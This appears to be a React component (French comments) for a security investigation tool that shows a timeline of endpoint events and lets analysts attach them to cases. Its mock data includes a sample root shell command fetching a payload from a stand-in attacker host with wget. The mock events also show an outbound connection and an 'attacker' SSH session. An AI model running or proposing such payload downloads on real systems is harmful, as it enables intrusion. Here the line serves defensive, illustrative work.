import React, { useState, useEffect } from 'react';
// Supposons qu'on importe des icônes de react-icons
// import { FaTerminal, FaShieldAlt, FaNetworkWired } from 'react-icons/fa';

const ICONS = {
  shell_history: '💻',
  auth_logs: '🔐',
  network_connections: '🌐',
  macos_persistence: '🍎',
  macos_unified_logs: '📋'
};

function InvestigationTimeline({ agentId }) {
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showCaseModal, setShowCaseModal] = useState(false);
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cases, setCases] = useState([]);

  useEffect(() => {
    // On appelle plusieurs endpoints de l'API en parallèle
    Promise.all([
      // fetch(`/api/v1/data/shell_history?agentId=${agentId}`),
      // fetch(`/api/v1/data/auth_logs?agentId=${agentId}`),
      // fetch(`/api/v1/data/network_connections?agentId=${agentId}`)
    ]).then(async ([res1, res2, res3]) => {
      // const shellEvents = await res1.json();
      // const authEvents = await res2.json();
      // const netEvents = await res3.json();

      // Logique pour transformer et fusionner les données
      // ...
      
      // Trier tous les événements par timestamp
      // const allEvents = [...shellEvents, ...authEvents, ...netEvents];
      // allEvents.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
      // setEvents(allEvents);

      // Données mock pour l'exemple
      const mockEvents = [
        {
          timestamp: "2024-01-15T10:30:00Z",
          source: "shell_history",
          summary: "Utilisateur root a exécuté wget http://evil.com/payload.sh",
          severity: "high",
          details: {
            username: "root",
            command: "wget http://evil.com/payload.sh",
            shell_type: "bash"
          }
        },
        {
          timestamp: "2024-01-15T10:31:00Z",
          source: "network_connections",
          summary: "Nouvelle connexion sortante vers 1.2.3.4:80 par le processus wget",
          severity: "medium",
          details: {
            protocol: "tcp",
            state: "ESTAB",
            peer_address: "1.2.3.4",
            peer_port: 80,
            process_name: "wget",
            geo_country: "Unknown"
          }
        },
        {
          timestamp: "2024-01-15T10:32:00Z",
          source: "auth_logs",
          summary: "Nouvelle session ouverte pour l'utilisateur attacker",
          severity: "high",
          details: {
            process_name: "sshd",
            message: "session opened for user attacker"
          }
        }
      ];
      setEvents(mockEvents);
      setLoading(false);
    }).catch(error => {
      console.error("Erreur lors du chargement des données:", error);
      setLoading(false);
    });

    // Charger les cas disponibles
    // fetch('/api/v1/cases/')
    //   .then(res => res.json())
    //   .then(data => setCases(data));
    setCases([
      { id: 1, title: "Suspicious PowerShell Activity" },
      { id: 2, title: "Unusual Network Connections" }
    ]);
  }, [agentId]);

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'high':
        return '#dc3545';
      case 'medium':
        return '#fd7e14';
      case 'low':
        return '#28a745';
      default:
        return '#6c757d';
    }
  };

  const handleAddToCase = (event) => {
    setSelectedEvent(event);
    setShowCaseModal(true);
  };

  const handleCaseSelection = (caseId) => {
    if (!selectedEvent) return;
    
    // Appeler l'API pour ajouter l'événement comme preuve
    // fetch(`/api/v1/cases/${caseId}/evidence`, {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({
    //     summary: selectedEvent.summary,
    //     source_type: selectedEvent.source,
    //     source_data: selectedEvent.details
    //   })
    // }).then(res => res.json())
    //   .then(data => {
    //     console.log("Evidence added successfully:", data);
    //     setShowCaseModal(false);
    //     setSelectedEvent(null);
    //   });
    
    console.log("Promoting event to evidence:", selectedEvent, "for case:", caseId);
    setShowCaseModal(false);
    setSelectedEvent(null);
  };

  if (loading) {
    return <div>Chargement de la timeline...</div>;
  }

  return (
    <div className="timeline-container">
      <h2>Timeline des Événements - Agent {agentId}</h2>
      
      {/* Modal pour sélectionner un cas */}
      {showCaseModal && (
        <div className="modal-overlay">
          <div className="modal">
            <h3>Ajouter à un cas</h3>
            <p>Événement: {selectedEvent?.summary}</p>
            <div className="case-selection">
              {cases.map(c => (
                <button 
                  key={c.id} 
                  className="btn btn-outline"
                  onClick={() => handleCaseSelection(c.id)}
                >
                  {c.title}
                </button>
              ))}
            </div>
            <button 
              className="btn btn-secondary"
              onClick={() => setShowCaseModal(false)}
            >
              Annuler
            </button>
          </div>
        </div>
      )}
      
      <div className="timeline">
        {events.map((event, index) => (
          <div key={index} className="timeline-item" style={{ borderLeftColor: getSeverityColor(event.severity) }}>
            <div className="timeline-icon">
              {ICONS[event.source] || '📋'}
            </div>
            <div className="timeline-content">
              <span className="timestamp">{new Date(event.timestamp).toLocaleString()}</span>
              <p className="summary">{event.summary}</p>
              <div className="event-details">
                <small>Source: {event.source} | Sévérité: {event.severity}</small>
              </div>
              <div className="timeline-item-actions">
                <button 
                  className="btn btn-sm btn-outline"
                  onClick={() => handleAddToCase(event)}
                >
                  Ajouter à un cas
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default InvestigationTimeline; 